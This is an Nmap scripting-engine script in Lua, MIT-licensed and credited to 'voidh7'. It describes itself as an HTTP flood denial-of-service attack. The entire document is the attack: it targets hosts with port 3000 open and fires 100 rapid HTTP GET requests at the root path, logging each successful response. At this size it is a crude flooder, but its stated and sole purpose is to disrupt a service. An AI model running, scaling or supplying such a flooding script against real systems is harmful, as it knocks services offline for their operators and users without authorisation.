description = [[make http fload Dos attack]]
author = "voidh7"
license = "MIT"
categories = {"intrusive"}


portrule = function(host,port)
 return port.number == 3000 and port.state == "open"
end

action = function(host,port)
local http = require "http"
local stdnse = require "stdnse"
local logs = {}

for i=1,100 do
    local response = http.get(host,port,"/")
    if response.status == 200 then
    table.insert(logs,"[*]Request submitted successfully")
    end
    stdnse.sleep(0.01)


 end
return table.concat(logs,"\n")
end
